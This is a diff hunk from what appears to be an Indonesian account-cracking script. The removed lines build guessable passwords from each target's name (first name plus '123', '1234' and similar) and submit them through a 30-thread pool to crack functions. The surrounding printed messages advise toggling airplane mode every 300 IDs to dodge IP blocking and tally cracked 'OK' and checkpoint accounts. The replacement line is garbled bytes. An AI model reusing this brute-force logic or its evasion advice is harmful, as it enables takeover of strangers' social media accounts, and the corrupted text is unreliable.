@@ -282,38 +282,7 @@ def passwrd():
 	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
 	_____animasi__berjalan_____(f'{P} => Mainkan Mode Pesawat Setiap 300ID Agar Antisipasi Spam IP')
 	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = ['kamu nanya','kamunanya','kata sandi']
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if   'bisnis' in method:pool.submit(crack1,idf,pwv,nmf)
-			elif 'prodv1' in method:pool.submit(crack2,idf,pwv,nmf)
-			elif 'prodv2' in method:pool.submit(crack3,idf,pwv,nmf)
-			else:pool.submit(crack1,idf,pwv,nmf)
-	print('\r')
+	�+a�����p���
 	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
 	_____animasi__berjalan_____(f'{X} => {P}Crack {H}%s{P} ID Selesai, Hasil Akun OK : {H}%s{P} Dan Akun CP : {M}%s{N}'%(len(id),ok,cp))
 	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
